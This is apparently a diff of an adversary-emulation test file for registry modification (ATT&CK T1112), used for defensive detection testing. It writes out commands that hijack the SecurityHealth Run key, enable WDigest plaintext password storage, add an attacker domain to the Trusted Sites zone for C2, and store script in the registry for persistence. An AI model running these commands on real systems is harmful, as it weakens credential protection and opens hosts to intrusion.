@@ -1,136 +1,93 @@
----
 attack_technique: T1112
 display_name: Modify Registry
-
 atomic_tests:
 - name: Modify Registry of Current User Profile - cmd
+  auto_generated_guid: 1324796b-d0f6-455a-b4ae-21ffee6aa6b9
   description: |
-    Modify the registry of the currently logged in user using reg.exe cia cmd console
+    Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message "The operation completed successfully."
+    will be displayed. Additionally, open Registry Editor to view the new entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced.
   supported_platforms:
-    - windows
+  - windows
   executor:
-    name: command_prompt
-    elevation_required: true
     command: |
       reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
     cleanup_command: |
-      reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /f
-
-- name: Modify Registry of Local Machine - cmd
-  description: |
-    Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when
-    CMD is ran as Administrative rights.
-  supported_platforms:
-    - windows
-  executor:
+      reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /f >nul 2>&1
     name: command_prompt
     elevation_required: true
-    command: |
-      reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d {some_other_executable} /f
-    cleanup_command: |
-      reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /f
-
-- name: Modify Registry of Another User Profile
+- name: Modify Registry of Local Machine - cmd
+  auto_generated_guid: 282f929a-6bc5-42b8-bd93-960c3ba35afe
   description: |
-    Modify a registry key of each user profile not currently loaded on the machine using both powershell and cmd line tools.
+    Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when
+    CMD is ran as Administrative rights. Upon execution, the message "The operation completed successfully."
+    will be displayed. Additionally, open Registry Editor to view the modified entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
   supported_platforms:
-    - windows
-  executor:
-    name: powershell
-    elevation_required: true
-    command: |
-      # here is an example of using the same method of reg load, but without the New-PSDrive cmdlet.
-      # Here we can load all unloaded user hives and do whatever we want in the location below (comments)
-      $PatternSID = 'S-1-5-21-\d+-\d+\-\d+\-\d+$'
-
-      Write-Verbose -Message 'Gathering Profile List and loading their registry hives'
-      # Get Username, SID, and location of ntuser.dat for all users
-
-      $ProfileList = @()
-      $ProfileList = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' | Where-Object { $_.PSChildName -match $PatternSID } |
-        Select  @{ name = "SID"; expression = { $_.PSChildName } },
-                @{ name = "UserHive"; expression = { "$($_.ProfileImagePath)\ntuser.dat" } },
-                @{ name = "Username"; expression = { $_.ProfileImagePath -replace '^(.*[\\\/])', '' } }
-
-      # Get all user SIDs found in HKEY_USERS (ntuder.dat files that are loaded)
-      $LoadedHives = Get-ChildItem Registry::HKEY_USERS | ? { $_.PSChildname -match $PatternSID } | Select @{ name = "SID"; expression = { $_.PSChildName } }
-
-      $SIDObject = @()
-
-      foreach ($item in $LoadedHives)
-      {
-          $props = @{
-              SID = $item.SID
-          }
-
-          $TempSIDObject = New-Object -TypeName PSCustomObject -Property $props
-          $SIDObject += $TempSIDObject
-      }
-
-      # We need to use ($ProfileList | Measure-Object).count instead of just ($ProfileList).count because in PS V2
-      # if the count is less than 2 it doesn't work. :)
-      for ($p = 0; $p -lt ($ProfileList | Measure-Object).count; $p++)
-      {
-          for ($l = 0; $l -lt ($SIDObject | Measure-Object).count; $l++)
-          {
-              if (($ProfileList[$p].SID) -ne ($SIDObject[$l].SID))
-              {
-                  $UnloadedHives += $ProfileList[$p].SID
-                  Write-Verbose -Message "Loading Registry hives for $($ProfileList[$p].SID)"
-                  reg load "HKU\$($ProfileList[$p].SID)" "$($ProfileList[$p].UserHive)"
-
-                  Write-Verbose -Message 'Attempting to modify registry keys for each profile'
-                  #####################################################################
-                  reg add "HKEY_CURRENT_USER\$($ProfileList[$p].SID)\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /t REG_DWORD /v HideFileExt /d 1 /f
-              }
-          }
-      }
-
-      Write-Verbose 'Unloading Registry hives for all users'
-      # Unload ntuser.dat
-      ### Garbage collection and closing of ntuser.dat ###
-      [gc]::Collect()
-      reg unload "HKU\$($ProfileList[$p].SID)"
-
-- name: Modify registry to store logon credentials
-  description: |
-    Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping)
-  supported_platforms:
-    - windows
-  executor:
-      name: command_prompt
-      elevation_required: true
-      command: |
-        reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
-      cleanup_command: |
-        reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
-
-- name: Modify registry to store PowerShell code
-  description: |
-    Sets Windows Registry key containing base64-encoded PowerShell code.
-  supported_platforms:
-    - windows
+  - windows
   input_arguments:
-      powershell_command:
-        description: PowerShell command to encode
-        type: String
-        default: Write-Host "Hey, Atomic!"
-      registry_key_storage:
-        description: Windows Registry Key to store code
-        type: String
-        default: HKCU:Software\Microsoft\Windows\CurrentVersion
-      registry_entry_storage:
-        description: Windows Registry entry to store code under key
-        type: String
-        default: Debug
+    new_executable:
+      description: New executable to run on startup instead of Windows Defender
+      type: string
+      default: calc.exe
   executor:
-    name: powershell
-    elevation_required: false
     command: |
-      $OriginalCommand = '#{powershell_command}'
-      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
-      $EncodedCommand =[Convert]::ToBase64String($Bytes)
-      $EncodedCommand
-      Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
+      reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f
     cleanup_command: |
-      Remove-ItemProperty -Force -Path -Path #{registry_key_storage} -Name #{registry_entry_storage}
+      reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /f >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: Modify registry to store logon credentials
+  auto_generated_guid: c0413fb5-33e2-40b7-9b6f-60b29f4a7a18
+  description: |
+    Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).
+    Upon execution, the message "The operation completed successfully." will be displayed.
+    Additionally, open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+    cleanup_command: |
+      reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: Add domain to Trusted sites Zone
+  auto_generated_guid: cf447677-5a4e-4937-a82c-e47d254afd57
+  description: |
+    Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.
+    Upon execution, details of the new registry entries will be displayed.
+    Additionally, open Registry Editor to view the modified entry in HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\.
+
+    https://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf
+  supported_platforms:
+  - windows
+  input_arguments:
+    bad_domain:
+      description: Domain to add to trusted site zone
+      type: String
+      default: bad-domain.com
+  executor:
+    command: |
+      $key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\"
+      $name ="bad-subdomain"
+      new-item $key -Name $name -Force
+      new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
+      new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
+      new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
+    cleanup_command: |
+      $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\"
+      Remove-item  $key -Recurse -ErrorAction Ignore
+    name: powershell
+- name: Javascript in registry
+  auto_generated_guid: 15f44ea9-4571-4837-be9e-802431a7bfae
+  description: |
+    Upon execution, a javascript block will be placed in the registry for persistence.
+    Additionally, open Registry Editor to view the modified entry in HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -Value "<script>"
+    cleanup_command: |
+      Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -ErrorAction Ignore
+    name: powershell
+
